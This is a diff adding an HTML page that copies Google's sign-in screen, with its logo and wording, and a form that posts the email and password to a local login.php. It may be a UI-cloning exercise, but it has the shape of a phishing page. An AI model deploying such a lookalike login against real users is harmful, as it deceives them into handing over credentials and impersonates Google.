@@ -1,0 +1,35 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="google.css">
+    <title>Google Login Form</title>
+</head>
+<body>
+    <div class="box">
+        <div id="logo" class="google-logo" title="Google">
+            <img src="photos/google-logo.png" width="75" height="24">
+        </div>
+        <h2>Sign in</h2>
+        <p>Use your Google Account</p>
+
+        <form action="login.php" method="POST" class="log-in-form">
+            <div class="inputBox">
+                <input type="email" name="email" required>
+                <label>Email or phone</label>
+            </div>
+            <div class="inputBox">
+                <input type="password" name="password" required>
+                <label>Password</label>
+            </div>
+            <div class="forgot">
+                <button type="button">Forgot email?</button>
+            </div>
+            <input type="submit" name="sign-in" value="Sign In">
+        </form>
+    </div>
+    <script src="script.js"></script>
+</body>
+</html>
+
